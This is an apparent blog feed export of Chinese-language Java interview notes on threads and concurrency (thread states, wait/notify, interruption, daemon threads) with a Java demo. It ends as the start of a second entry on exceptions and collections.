        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了Java线程知识考点</p><a id="more"></a><!-- toc --><ul><li><a href="#进程和线程的区别">进程和线程的区别</a><ul><li><a href="#进程是资源分配的最小单位线程是cpu调度的最小单位">进程是资源分配的最小单位，线程是CPU调度的最小单位</a></li><li><a href="#进程和线程的区别-">进程和线程的区别 -</a></li><li><a href="#总结">总结</a></li><li><a href="#进程和线程通信方式-">进程和线程通信方式 -</a></li></ul></li><li><a href="#java进程和线程的关系-">Java进程和线程的关系 -</a></li><li><a href="#java中thread的start和run方法的区别">Java中Thread的start和run方法的区别 √</a></li><li><a href="#thread-runnable以及callable有什么区别-">Thread、Runnable以及Callable有什么区别 -</a></li><li><a href="#如何给run方法传参">如何给run()方法传参</a><ul><li><a href="#实现的方式主要有三种-">实现的方式主要有三种 -</a></li><li><a href="#如何获取线程的返回值">如何获取线程的返回值 √</a><ul><li><a href="#方法1主线程等待法">方法1：主线程等待法</a></li><li><a href="#方法2使用thread类的join阻塞当前线程等待子线程处理完毕">方法2：使用Thread类的join()阻塞当前线程等待子线程处理完毕</a></li><li><a href="#方法3通过callable接口实现通过futuretask-or-线程池获取">方法3：通过Callable接口实现：通过FutureTask Or 线程池获取</a></li><li><a href="#threadpool">ThreadPool</a></li></ul></li></ul></li><li><a href="#线程的状态">线程的状态</a></li><li><a href="#sleep和wait-">Sleep和wait -</a><ul><li><a href="#基本的差别">基本的差别</a></li><li><a href="#最主要的本质区别">最主要的本质区别</a></li></ul></li><li><a href="#notify和notifyall的区别">Notify和notifyAll的区别 √</a><ul><li><a href="#两个概念">两个概念</a><ul><li><a href="#锁池entrylist">锁池EntryList</a></li><li><a href="#等待池waitset">等待池WaitSet</a></li></ul></li></ul></li><li><a href="#yeild方法">Yeild方法 √</a></li><li><a href="#守护线程-">守护线程 -</a></li><li><a href="#如何中断线程">如何中断线程 √</a><ul><li><a href="#已经被抛弃的方法">已经被抛弃的方法</a></li><li><a href="#目前使用的方法">目前使用的方法</a></li></ul></li><li><a href="#线程状态图">线程状态图</a></li></ul><!-- tocstop --><h2><span id="进程和线程的区别">进程和线程的区别</span></h2><p><img src="clip_image002.jpg" alt></p><h3><span id="进程是资源分配的最小单位线程是cpu调度的最小单位">进程是资源分配的最小单位，线程是CPU调度的最小单位</span></h3><p>Ø 所有与进程相关的资源，都被记录在PCB中</p><p>Ø 进程是抢占处理器的调度单位；线程属于某个进程，共享其资源</p><p>Ø 线程只由栈、寄存器，程序计数器和TCB组成</p><p><img src="image-20200405094518246.png" alt></p><h3><span id="进程和线程的区别-">进程和线程的区别 -</span></h3><p><font color="red">根本区别</font>：进程是资源分配的最小单位，而线程CPU调度的最小单位</p><p><font color="red">开销方面</font>：每个进程都有独立的代码和数据空间（程序上下文），进程之间切换开销大；线程可以看做轻量级的进程，同一类线程共享代码和数据空间，每个线程都有自己独立的运行栈、寄存器和程序计数器（PC），线程之间切换的开销小 </p><p><font color="red">所处环境</font>：在操作系统中能同时运行多个进程（程序）；而在同一个进程（程序）中有多个线程同时执行（通过CPU调度，在每个时间片中只有一个线程执行） </p><p><font color="red">内存分配</font>：系统在运行的时候会为每个进程分配不同的内存空间；而对线程而言，除了CPU外，系统不会为线程分配内存（线程所使用的资源来自其所属进程的资源），线程组之间只能共享资源</p><h3><span id="总结">总结</span></h3><p>Ø 线程不能看作独立应用，而进程可以看作独立应用</p><p>Ø 进程有独立的地址空间，相互不影响，线程只是进程的不同执行路径</p><p>Ø 线程没有独立的地址空间，多进程的程序比多线程程序健壮</p><p>Ø 进程切换比线程的切换开销大</p><h3><span id="进程和线程通信方式-">进程和线程通信方式 -</span></h3><p><strong>进程</strong>：</p><p>（1）管道（pipe，半双工），流管道（s_pipe，全双工），有名管道（FIFO，全双工）<br>（2）信号量（sophomore/mutex）<br>（3）信号（signal）<br>（4）消息队列<br>（5）共享内存<br>（6）套接字（socket）</p><p><strong>线程</strong>：</p><p>（1）volatile变量<br>（2）使用Object类的wait() 和 notify() 方法<br>（3）使用JUC工具类 CountDownLatch、CyclicBarrier、Exchanger、Semaphore<br>（4）使用 ReentrantLock 结合 Condition<br>（5）LockSupport方法<br>（6）阻塞队列</p><h2><span id="java进程和线程的关系-">Java进程和线程的关系 -</span></h2><p>Ø Java对操作系统提供的功能进行封装，包括进程和线程</p><p>Ø 运行一个程序会产生一个进程，进程包含至少一个线程</p><p>Ø 每个进程对应一个<font color="red">JVM实例</font>，多个线程共享JVM里的堆</p><p>Ø Java采用单线程编程模型，程序会自动创建主线程</p><p>Ø 主线程可以创建子线程，原则上要后于子线程完成执行</p><p><font color="red">JVM是多线程的</font></p><p>JVM实例在创建的时候同时会创建很多其他的线程，比如GC的线程。</p><p>各个JVM实例之间是相互隔离的。</p><h2><span id="java中thread的start和run方法的区别">Java中Thread的start和run方法的区别 √</span></h2><p><img src="image-20200405095635582.png" alt></p><p><img src="image-20200405095643937.png" alt></p><p><img src="image-20200405095653496.png" alt></p><p>调用线程的start方法是创建了新的线程，在新的线程中执行。<br>调用线程的run方法是在主线程中执行该方法，和调用普通方法一样</p><h2><span id="thread-runnable以及callable有什么区别-">Thread、Runnable以及Callable有什么区别 -</span></h2><p><img src="image-20200405095750934.png" alt></p><ul><li>由于java不能多继承可以实现多个接口，因此，在创建线程的时候尽量多考虑采用实现接口的形式；</li><li>实现callable接口，提交给ExecutorService返回的是异步执行的结果，另外，通常也可以利用FutureTask(Callable  callable)将callable进行包装然后FutureTask提交给ExecutorService。</li></ul><p>·     callable的核心是call方法，允许返回值，runnable的核心是run方法，没有返回值</p><p>·     call方法可以抛出异常，但是run方法不行</p><p><img src="image-20200405095815514.png" alt></p><p><img src="image-20200405095822530.png" alt></p><p><img src="image-20200405095831324.png" alt></p><p>Ø Thread是实现了<font color="red">Runnable接口的类</font>，使得run支持多线程</p><p><strong>Future就是对于具体的Runnable或者Callable任务的执行结果进行</strong>取消、查询是否完成、获取结果、设置结果操作</p><p>FutureTask类实现了RunnableFuture接口,<code>所以它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值</code></p><p>可以看出RunnableFuture继承了Runnable接口和Future接口，而FutureTask实现了RunnableFuture接口。所以它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值。</p><h2><span id="如何给run方法传参">如何给run()方法传参</span></h2><h3><span id="实现的方式主要有三种-">实现的方式主要有三种 -</span></h3><p>Ø 构造参数传参</p><p>Ø 成员变量传参</p><p>Ø 回调函数传参</p><p><img src="image-20200405101302498.png" alt></p><h3><span id="如何获取线程的返回值">如何获取线程的返回值 √</span></h3><h4><span id="方法1主线程等待法">方法1：主线程等待法</span></h4><p><img src="image-20200405101320713.png" alt></p><p>缺点是控制时间不够精准，而且逻辑一多实现起来很麻烦</p><h4><span id="方法2使用thread类的join阻塞当前线程等待子线程处理完毕">方法2：使用Thread类的join()阻塞当前线程等待子线程处理完毕</span></h4><p><img src="image-20200405101511632.png" alt></p><p>缺点是粒度不够细，比如说无法做到线程1达到某个时刻去执行线程2的方法</p><h4><span id="方法3通过callable接口实现通过futuretask-or-线程池获取">方法3：通过Callable接口实现：通过FutureTask Or 线程池获取</span></h4><p><img src="image-20200405101544024.png" alt></p><p><img src="image-20200405101550999.png" alt></p><h4><span id="threadpool">ThreadPool</span></h4><p><img src="image-20200405101621964.png" alt></p><p>提交多个实现callable的类，让线程池并发的处理结果。统一管理</p><h2><span id="线程的状态">线程的状态</span></h2><p><img src="image-20200405101708723.png" alt></p><p>Ø 新建（New）：创建后尚未启动的线程的状态</p><p>Ø 运行（Runnable）：包含Running和Ready</p><p>Ø 无限期等待（waiting）：不会被分配CPU执行时间，需要显式被唤醒</p><table><thead><tr><th><strong>进入方法</strong></th><th><strong>退出方法</strong></th></tr></thead><tbody><tr><td>没有设置Timeout参数的Object.wait()方法</td><td>Object.notify() /  Object.notfifyAll()</td></tr><tr><td>没有设置Timeout参数的Thread.join()方法</td><td>被调用的线程执行完毕</td></tr><tr><td>LockSupport.park()方法</td><td>LockSupport.unpark</td></tr></tbody></table><p>Ø 限期等待（Timed Waiting）：在一定时间后会由系统自动唤醒</p><table><thead><tr><th><strong>进入方法</strong></th><th><strong>退出方法</strong></th></tr></thead><tbody><tr><td>Thread.sleep()方法</td><td>时间结束</td></tr><tr><td>设置了Timeout参数的Object.wait()方法</td><td>时间结束/Object.notify()/   Object.notfifyAll()</td></tr><tr><td>设置了Timeout参数的Thread.join()方法</td><td>时间结束 / 被调用的线程执行完毕</td></tr><tr><td>LockSupport.parkNanos  方法</td><td>LockSupport.unpark</td></tr><tr><td>LockSupport.parkUntil 方法</td><td>LockSupport.unpark</td></tr></tbody></table><p>Ø 阻塞（Blocked）:等待获取排他锁</p><p>Ø 结束（Terminated）：已终止线程的状态，线程已经结束执行</p><p>结束后运行join会发生异常</p><p><img src="image-20200405101912677.png" alt></p><h2><span id="sleep和wait-">Sleep和wait -</span></h2><h3><span id="基本的差别">基本的差别</span></h3><p>Ø Sleep是Thread类的方法，wait是Object类中定义的方法</p><p>Ø Sleep()方法可以在任何地方使用</p><p>Ø Wait()方法只能在synchronized方法或者synchronized块中使用</p><p>Ø sleep()方法在休眠时间达到后如果再次获得CPU时间片就会继续执行，而wait()方法必须等待Object.notift/Object.notifyAll通知后，才会离开等待池，并且再次获得CPU时间片才会继续执行。</p><h3><span id="最主要的本质区别">最主要的本质区别</span></h3><p>Ø Thread.sleep只会让出CPU，不会导致锁行为的改变</p><p>Ø Object.wait不仅让出CPU，还会释放已经占有的同步资源锁</p><p> <img src="image-20200405103009700.png" alt></p><p><img src="image-20200405103019328.png" alt></p><p>第一个实现wait逻辑，第二个实现sleep逻辑。</p><p>在第一个线程start后sleep 10ms再运行第二个线程。</p><p>此时由于线程A使用wait方法，所以B可以拿到锁。</p><p><strong>Thread A is waiting to get lock</strong></p><p><strong>Thread A get lock</strong></p><p><strong>Thread B is waiting to get lock</strong></p><p><strong>Thread A do wait method</strong></p><p><strong>Thread B get lock</strong></p><p><strong>Thread B is sleeping 10ms</strong></p><p><strong>Thread B is done</strong></p><p><strong>Thread A is done</strong></p><p>如果A使用Sleep：</p><p><strong>Thread A is waiting to get lock</strong></p><p><strong>Thread A get lock</strong></p><p><strong>Thread B is waiting to get lock</strong></p><p><strong>Thread A do wait method</strong></p><p><strong>Thread A is done</strong></p><p><strong>Thread B get lock</strong></p><p><strong>Thread B is sleeping 10ms</strong></p><p><strong>Thread B is done</strong></p><p>回到线程A wait（不给参数，无限等待），线程B sleep的状态</p><p>就会发现A无限等待，然后B已经执行完了，程序还没结束。</p><p>此时可以在B中加入notify来唤醒A、或者notifyall</p><p><img src="image-20200405103049686.png" alt></p><h2><span id="notify和notifyall的区别">Notify和notifyAll的区别 √</span></h2><h3><span id="两个概念">两个概念</span></h3><h4><span id="锁池entrylist">锁池EntryList</span></h4><p>假设线程A已经拥有了某个对象（不是类）的锁，而其他线程B、C想要调用这个对象的某个synchronized方法（或者块），由于B、C线程在进入对象的synchronized方法（或者块）之前必须先获得该对象锁的拥有权，而恰巧该对象的锁目前正被线程A所占用，此时B、C线程就会被阻塞，进入一个地方去等待锁的释放，这个地方便是该对象的锁池。 </p><h4><span id="等待池waitset">等待池WaitSet</span></h4><p>假设线程A调用了某个对象的wait()方法，线程A就会释放该对象的锁，同时线程A就进入到了该对象的等待池中，进入到等待池中的线程不会去竞争该对象的锁</p><p>Ø NotifyAll会让所有处于等待池的线程全部进入锁池去竞争获取锁的机会</p><p>Ø Notify只会随机选择一个处于等待池中的线程进入锁池去竞争获取锁的机会</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.interview.javabasic.thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.logging.Level;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotificationDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> go = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> NotificationDemo test = <span class="keyword">new</span> NotificationDemo();</span><br><span class="line"></span><br><span class="line">        Runnable waitTask = <span class="keyword">new</span> Runnable()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    test.shouldGo();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">" finished Execution"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Runnable notifyTask = <span class="keyword">new</span> Runnable()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                test.go();</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">" finished Execution"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(waitTask, <span class="string">"WT1"</span>); <span class="comment">//will wait</span></span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(waitTask, <span class="string">"WT2"</span>); <span class="comment">//will wait</span></span><br><span class="line">        Thread t3 = <span class="keyword">new</span> Thread(waitTask, <span class="string">"WT3"</span>); <span class="comment">//will wait</span></span><br><span class="line">        Thread t4 = <span class="keyword">new</span> Thread(notifyTask,<span class="string">"NT1"</span>); <span class="comment">//will notify</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//starting all waiting thread</span></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//pause to ensure all waiting thread started successfully</span></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//starting notifying thread</span></span><br><span class="line">        t4.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * wait and notify can only be called from synchronized method or bock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">shouldGo</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(go != <span class="keyword">true</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread()</span><br><span class="line">                    + <span class="string">" is going to wait on this object"</span>);</span><br><span class="line">            wait(); <span class="comment">//release lock and reacquires on wakeup</span></span><br><span class="line">            System.out.println(Thread.currentThread() + <span class="string">" is woken up"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        go = <span class="keyword">false</span>; <span class="comment">//resetting condition</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * both shouldGo() and go() are locked on current object referenced by "this" keyword</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">go</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (go == <span class="keyword">false</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread()</span><br><span class="line">                    + <span class="string">" is going to notify all or one thread waiting on this object"</span>);</span><br><span class="line"></span><br><span class="line">            go = <span class="keyword">true</span>; <span class="comment">//making condition true for waiting thread</span></span><br><span class="line">            <span class="comment">//notify(); // only one out of three waiting thread WT1, WT2,WT3 will woke up</span></span><br><span class="line">            notifyAll(); <span class="comment">// all waiting thread  WT1, WT2,WT3 will woke up</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20200405103135404.png" alt></p><p>如果改成notifyAll</p><p><img src="image-20200405103148463.png" alt></p><p>所有的线程都被唤醒了，但是最后<font color="red">只有一个执行成功</font>。其余线程<font color="red">又回到等待池</font>中。</p><h2><span id="yeild方法">Yeild方法 √</span></h2><p>用了yield方法后，该线程就会把CPU时间让掉，让其他或者自己的线程执行（也就是谁先抢到谁执行）</p><p>Yield对锁的行为没有影响 </p><p>只会分配<strong>给当前线程相同优先级</strong>的线程 </p><p>在Java程序中，通过一个<strong>整型成员变量</strong>Priority<strong>来控制优先级，优先级的范围从1~10.在构建线程的时候可以通过</strong>setPriority(int)方法进行设置，默认优先级为5，优先级高的线程相较于优先级低的线程优先获得处理器时间片。需要注意的是在不同JVM以及操作系统上，线程规划存在差异，有些操作系统甚至会忽略线程优先级的设定。</p><p><img src="image-20200405103912517.png" alt></p><p><img src="image-20200405103920271.png" alt></p><p><img src="image-20200405103928822.png" alt></p><p>Yield对锁的行为没有影响</p><h2><span id="守护线程-">守护线程 -</span></h2><p>守护线程是一种特殊的线程，就和它的名字一样，它是系统的守护者，在后台默默地守护一些系统服务，比如垃圾回收线程就可以理解守护线程。与之对应的就是用户线程，用户线程就可以认为是系统的工作线程，它会完成整个系统的业务操作。</p><p>这里需要注意的是<strong>守护线程在退出的时候并不会执行finnally</strong>块中的代码，所以将释放资源等操作不要放在finnally块中执行，这种操作是不安全的</p><p>线程可以通过setDaemon(true)的方法将线程设置为守护线程。并且需要注意的是设置守护线程要先于start()方法，否则会报</p><p>Exception in thread “main” java.lang.IllegalThreadStateException at java.lang.Thread.setDaemon(Thread.java:1365) at learn.DaemonDemo.main(DaemonDemo.java:19)</p><p>这样的异常，但是该线程还是会执行，只不过会当做正常的用户线程执行。</p><h2><span id="如何中断线程">如何中断线程 √</span></h2><h3><span id="已经被抛弃的方法">已经被抛弃的方法</span></h3><p>Ø 通过调用stop()方法停止线程</p><p>Ø 通过调用suspend()和resume()方法</p><p>stop方法是一种“恶意”的中断，一旦执行stop方法，即终止当前正在运行的线程，不管线程逻辑是否完整，这是非常危险的， stop方法会破坏原子逻辑也可能会导致数据不同步。</p><p>suspend(）在导致线程暂停的同时，并不会去释放任何锁资源</p><p>如果resume()操作意外地在suspend()前就执行了，那么被挂起的线程可能很难有机会被继续执行。并且，更严重的是：它所占用的锁不会被释放，因此可能会导致整个系统工作不正常。</p><h3><span id="目前使用的方法">目前使用的方法</span></h3><p>Ø 调用interrupt(),通知线程应该中断了</p><p>a)   如果线程处于被阻塞状态，那么线程将立即退出被阻塞状态，并抛出一个InterruptedException异常。</p><p>b)   如果线程处于正常活动状态，那么会将该线程的中断标志设置为true。被设置中断标志的线程将会继续正常运行不受影响。</p><p>Ø 需要被调用的线程配合中断</p><p>a)   在正常运行任务时，经常检查本线程的中断标志位，如果被设置了中断标志就自行停止线程。</p><p>b)   如果线程处于正常活动状态，那么会将该线程的中断标志设置为true。被设置中断标志的线程将继续正常运行，不受影响。</p><p><img src="image-20200405104227952.png" alt></p><p>中断可以理解为线程的一个标志位，它表示了一个运行中的线程是否被其他线程进行了中断操作。中断好比其他线程对该线程打了一个招呼。其他线程可以调用该线程的interrupt()方法对其进行中断操作，同时该线程可以调用 isInterrupted（）来感知其他线程对其自身的中断操作，从而做出响应。另外，同样可以调用Thread的静态方法 interrupted（）对当前线程进行中断操作，该方法会清除中断标志位。<strong>需要注意的是，当抛出InterruptedException时候，会清除中断标志位，也就是说在调用isInterrupted会返回false</strong>。</p><p><img src="image-20200405104410385.png" alt></p><p><img src="image-20200405104418440.png" alt></p><p><img src="image-20200405104444644.png" alt></p><h2><span id="线程状态图">线程状态图</span></h2><p><img src="image-20200405104454839.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java常用类库与技巧</title>
      <link href="/2020/03/31/Java-jar/"/>
      <url>/2020/03/31/Java-jar/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了Java常用类库与技巧</p><a id="more"></a><!-- toc --><ul><li><a href="#java异常">Java异常</a><ul><li><a href="#异常处理机制主要回答了三个问题">异常处理机制主要回答了三个问题</a></li></ul></li><li><a href="#error和exception的区别">Error和Exception的区别</a><ul><li><a href="#从概念角度解析java的异常处理机制">从概念角度解析Java的异常处理机制</a></li><li><a href="#从责任角度看">从责任角度看</a></li></ul></li><li><a href="#常见error以及exception">常见Error以及Exception</a></li><li><a href="#java的异常处理机制">Java的异常处理机制</a></li><li><a href="#java异常的处理原则">Java异常的处理原则</a></li><li><a href="#高效主流的异常处理框架">高效主流的异常处理框架</a></li><li><a href="#try-catch的性能">Try-catch的性能</a><ul><li><a href="#java异常处理消耗性能的地方">Java异常处理消耗性能的地方【】</a></li></ul></li><li><a href="#java集合框架">Java集合框架</a><ul><li><a href="#数据结构考点">数据结构考点</a></li><li><a href="#算法考点">算法考点</a></li><li><a href="#考点拓展">考点拓展</a></li></ul></li><li><a href="#集合之map">集合之Map</a></li><li><a href="#为什么重写equals要重写hashcode">为什么重写equals要重写HashCode</a><ul><li><a href="#hashmap-hashtable-concurrenthashmap的区别">HashMap HashTable ConcurrentHashMap的区别</a></li><li><a href="#hashmapput方法的逻辑">HashMap：put方法的逻辑</a></li><li><a href="#hashmapget方法的逻辑">HashMap：get方法的逻辑</a></li><li><a href="#hashmap如何有效减少碰撞">HashMap：如何有效减少碰撞</a></li><li><a href="#为什么不直接用hashcode作为下标">为什么不直接用hashcode作为下标</a></li><li><a href="#hashmap扩容问题">HashMap：扩容问题</a></li><li><a href="#collectionssynchronizedmap和hashtable的区别">Collections.synchronizedMap和Hashtable的区别</a></li><li><a href="#concurrenthashmapput方法的逻辑">ConcurrentHashMap：put方法的逻辑</a></li><li><a href="#get-过程分析">get 过程分析</a></li><li><a href="#concurrenthashmap总结比起segment锁拆得更细">ConcurrentHashMap总结：比起Segment，锁拆得更细</a></li><li><a href="#concurrenthashmap别的需要注意的点">ConcurrentHashMap：别的需要注意的点</a></li><li><a href="#三者的区别">三者的区别</a></li></ul></li><li><a href="#java-util-concurrentjuc">Java util concurrent（JUC）</a><ul><li><a href="#javautilconcurrent提供了并发编程的解决方案">Java.util.concurrent:提供了并发编程的解决方案</a></li><li><a href="#juc包的分类">J.U.C包的分类</a></li><li><a href="#并发工具类">并发工具类</a><ul><li><a href="#countdownlatch让主线程等待一组事件发生后继续执行">CountDownLatch：让主线程等待一组事件发生后继续执行</a></li><li><a href="#cyclicbarrier阻塞当前线程等待其他线程">CyclicBarrier：阻塞当前线程，等待其他线程</a></li><li><a href="#semaphore控制某个资源可被同时访问的线程个数">Semaphore：控制某个资源可被同时访问的线程个数</a></li><li><a href="#exchanger两个线程到达同步点后相互交换数据">Exchanger：两个线程到达同步点后，相互交换数据</a></li></ul></li><li><a href="#blockingqueue提供可阻塞的入队和出队操作">BlockingQueue：提供可阻塞的入队和出队操作</a><ul><li><a href="#blockingqueue类型">BlockingQueue类型</a></li></ul></li></ul></li><li><a href="#同步与异步">同步与异步</a></li><li><a href="#阻塞和非阻塞">阻塞和非阻塞</a></li><li><a href="#bio-同步阻塞io模式">BIO (同步阻塞I/O模式)</a></li><li><a href="#nio同步非阻塞">NIO（同步非阻塞）</a></li><li><a href="#aio-异步非阻塞io模型">AIO （异步非阻塞I/O模型）</a></li><li><a href="#nio-如何实现多路复用功能">NIO 如何实现多路复用功能</a></li><li><a href="#aio-bio-nio的适用场景">AIO、BIO、NIO的适用场景</a></li><li><a href="#nio的核心概念">NIO的核心概念</a><ul><li><a href="#nio应用和框架等等">NIO应用和框架等等</a></li></ul></li></ul><!-- tocstop --><h2><span id="java异常">Java异常</span></h2><h3><span id="异常处理机制主要回答了三个问题">异常处理机制主要回答了三个问题</span></h3><p>Ø What：异常类型回答了什么被抛出</p><p>Ø Where：异常堆栈跟踪回答了在哪抛出</p><p>Ø Why：异常信息回答了为什么被抛出</p><h2><span id="error和exception的区别">Error和Exception的区别</span></h2><p>  <img src="image-20200331101145233.png" alt>                             </p><h3><span id="从概念角度解析java的异常处理机制">从概念角度解析Java的异常处理机制</span></h3><p>Ø Error：程序无法处理的系统错误，编译器不做检查</p><p>Ø Exception：程序可以处理的异常，捕获后可能恢复</p><p>Ø 总结：前者是程序无法处理的错误，后者是可以处理的异常</p><ul><li><p>RuntimeException：不可预知的，程序应当自行避免</p></li><li><p>非RuntimeException：可预知的，从编译器校验的异常 </p></li></ul><h3><span id="从责任角度看">从责任角度看</span></h3><ol><li><p>Error属于JVM需要负担的责任；</p></li><li><p>RuntimeException是程序应该负担的责任；</p></li><li><p>Checked Exception可检查异常是Java编译器应该负担的责任</p><p><img src="image-20200331101305428.png" alt>             </p></li></ol><p>Checked Exception是编译器必须要追踪且处理的异常，可以使用Try catch处理，或者使用throws 来抛出异常。虽然抛出异常可以抛出异常的父类，但是还是不要泛化异常，以便查询到异常。 </p><p>如果写方法的时候不使用try catch来捕获异常，则需要在调用此方法的位置进行处理。</p><p><img src="image-20200331101329377.png" alt></p><p><img src="image-20200331101340011.png" alt></p><p>如果调用者知道如何处理异常便可以使用try catch来处理。</p><p>如果不知道的话也可以向上抛出异常，将异常层层上抛直到被处理，或者到顶层抛出异常为止，这里main函数是顶层，如果直接throws就会终止程序。</p><p><img src="image-20200331101509470.png" alt></p><h2><span id="常见error以及exception">常见Error以及Exception</span></h2><p><strong>RuntimeException</strong></p><ol><li><p>NullPointerException-空指针引用异常</p></li><li><p>ClassCastException-类型强制转换异常</p></li><li><p>IllegalArgumentException-传递非法参数异常</p></li><li><p>IndexOutOfBoundsException-下标越界异常</p></li><li><p>NumberFormatException-数字格式异常</p></li></ol><p><strong>非RuntimeException</strong></p><ol><li><p>ClassNotFoundException-找不到指定class的异常</p></li><li><p>IOException-IO操作异常</p></li></ol><p><strong>Error</strong></p><ol><li><p>NoClassDefFoundError-找不到class定义的异常</p></li><li><p>StackOverFlowError-深递归导致栈被耗尽而抛出的异常</p></li><li><p>OutOfMemoryError-内存溢出异常</p></li></ol><p><strong>NoClassDefFoundError的成因</strong></p><ol><li><p>类依赖的class或者jar不存在</p></li><li><p>类文件存在，但是存在不同的域中</p></li><li><p>大小写问题，javac编译的时候是无视大小写的，很有可能编译出来的class文件就与想要的不一样</p></li></ol><h2><span id="java的异常处理机制">Java的异常处理机制</span></h2><p>   Ø 抛出异常：创建异常对象，交由运行时系统处理</p><p>   Ø 捕获异常：寻找合适的异常处理器处理异常，否则终止运行</p><p>​    </p><p>   <strong>Try with resources</strong></p><p>   在括号里面声明继承<em>AutoClosable的对象，在结束时自动关闭。</em></p><p><img src="image-20200331181358769.png" alt></p><p>为了确保外部资源一定要被关闭，通常关闭代码被写入finally代码块中，当然我们还必须注意到关闭资源时可能抛出的异常，于是变有了下面的经典代码：   </p><p><img src="image-20200331181431748.png" alt>                            